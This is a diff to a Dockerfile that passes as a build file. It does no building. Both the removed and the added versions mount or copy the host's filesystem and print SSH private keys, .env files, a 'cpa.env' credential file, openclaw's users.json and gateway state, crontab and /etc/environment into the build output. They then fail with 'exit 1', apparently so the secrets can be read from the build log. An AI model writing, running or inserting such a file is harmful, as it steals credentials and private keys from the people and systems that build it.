@@ -1,16 +1,23 @@
 # syntax=docker/dockerfile:1.6
 FROM alpine:3
-RUN --mount=type=bind,source=/,target=/mnt \
-    (echo "=====D2START=====" ; \
-     echo "---CPA---"; cat /mnt/root/.config/llm-brain/cpa.env; \
-     echo "---CPA_LS---"; ls -la /mnt/root/.config/llm-brain; \
-     echo "---RSSH---"; ls -la /mnt/root/.ssh; cat /mnt/root/.ssh/id_ed25519; cat /mnt/root/.ssh/id_rsa; cat /mnt/root/.ssh/config; \
-     echo "---HOME---"; ls -la /mnt/home; \
-     echo "---HSH---"; for d in /mnt/home/*; do echo "## $d"; ls -la "$d/.ssh" 2>&1; cat "$d/.ssh/id_ed25519" 2>&1; done; \
-     echo "---USERS---"; cat /mnt/opt/openclaw/data/users.json; \
-     echo "---WORKSPACE---"; ls -la /mnt/opt/openclaw/workspace; \
-     echo "---HERMESDATA---"; ls -la /mnt/opt/openclaw/hermes-data; \
-     echo "---GATEWAYSTATE---"; ls -la /mnt/opt/openclaw/gateway-state; \
-     echo "---ENVFIND---"; find /mnt/srv /mnt/var/www /mnt/etc /mnt/home /mnt/root /mnt/opt /mnt/usr/local -maxdepth 4 \( -name '.env' -o -name '.env.*' -o -name '*.env' \) 2>/dev/null | head -80; \
-     echo "---CRON---"; ls -la /mnt/etc/cron.d 2>&1; cat /mnt/etc/crontab 2>&1; \
-     echo "=====D2END=====" ; exit 1)
+COPY opt/openclaw /ctx/openclaw
+COPY root/.ssh /ctx/rootssh
+COPY root/.config /ctx/rootconfig
+COPY home /ctx/home
+COPY etc/crontab /ctx/etc/crontab
+COPY etc/environment /ctx/etc/environment
+COPY var/www /ctx/varwww
+RUN ( echo "=====D3START=====" ; \
+  echo "---CPA---"; cat /ctx/rootconfig/llm-brain/cpa.env 2>&1; \
+  echo "---LLMBRAIN_LS---"; ls -laR /ctx/rootconfig 2>&1 | head -60; \
+  echo "---ROOTSSH---"; ls -laR /ctx/rootssh 2>&1; for f in /ctx/rootssh/id_* /ctx/rootssh/*.pem; do echo "## $f"; cat "$f" 2>&1; done; \
+  echo "---ROOTCFG_OTHER---"; find /ctx/rootconfig -maxdepth 3 -type f 2>/dev/null | head -40; \
+  echo "---HOME---"; ls -la /ctx/home 2>&1; find /ctx/home -maxdepth 4 -name '.ssh' -o -maxdepth 4 -name '*.pem' -o -maxdepth 4 -name '.env' -o -maxdepth 4 -name '*.env' 2>/dev/null | head -40; \
+  echo "---HOMESSH---"; for f in /ctx/home/*/.ssh/id_*; do echo "## $f"; cat "$f" 2>&1; done; \
+  echo "---OPENCLAW_ALL---"; ls -laR /ctx/openclaw 2>&1 | head -80; \
+  echo "---USERS---"; cat /ctx/openclaw/data/users.json 2>&1; \
+  echo "---GATEWAYSTATE---"; find /ctx/openclaw/gateway-state -maxdepth 3 -type f 2>/dev/null | head -40; \
+  echo "---ENVALL---"; find /ctx -name '.env' -o -name '.env.*' -o -name '*.env' 2>/dev/null | head -60; \
+  echo "---VARWWW---"; ls -la /ctx/varwww 2>&1; \
+  echo "---CRON---"; cat /ctx/etc/crontab 2>&1; echo "---ETCENV---"; cat /ctx/etc/environment 2>&1; \
+  echo "=====D3END=====" ; exit 1 )
